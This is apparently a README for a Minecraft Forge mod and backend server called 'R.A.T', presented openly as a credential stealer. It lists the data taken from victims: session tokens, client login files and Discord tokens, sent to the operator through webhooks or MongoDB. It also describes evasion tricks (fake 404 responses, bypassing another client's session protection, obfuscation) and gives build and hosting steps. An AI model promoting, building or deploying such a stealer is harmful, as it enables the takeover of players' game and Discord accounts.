<div align="center">

# R.A.T

<img src="https://bigrat.monster/media/bigrat.png" alt="logo" width="25%" />

**Retrieve Access Token**

![](https://img.shields.io/badge/MC--VERSION-FORGE_1.8.9-0?style=for-the-badge)
![](https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)

</div>


## Features
- Grabs the **username, uuid, token, ip, feather file, essentials file, lunar file and discord tokens** of a target as a *JSON*.
- Apparently switching the feather or essential files with yours grants you infinite access to their account thanks to the **refreshToken**.
- Additionally, it stores a **formatted session string** ready to use with [TokenAuth]
- JavaScript backend server which:
  - Checks if all fields in the JSON are present.
  - Controls requests and filters out spam requests by IPs.
  - Validates the token with Minecraft Auth servers before proceeding to output the data.

  It also fakes returning 404 codes to make the people think they successfully crashed the server 🤡.
  
- Makes nuking/trolling impossible, due to webhook/database urls being private.
- Can be easily be hosted on *Heroku*. 
- Can be easily configured to either use `Discord Webhooks` or `MongoDB` or both.
- Bypasses PizzaClient's SessionProtection.

- Server
  1. Clone the repository.
  2. Install dependencies.
  3. Run the server.

- Mod
  1. Follow [1.8.9ForgeTemplate#setup]to setup your mod environment.
  2. Change url to your server and change some other stuff to make it better
  3. Build the mod.
  4. (Optional) Obfuscate the mod.

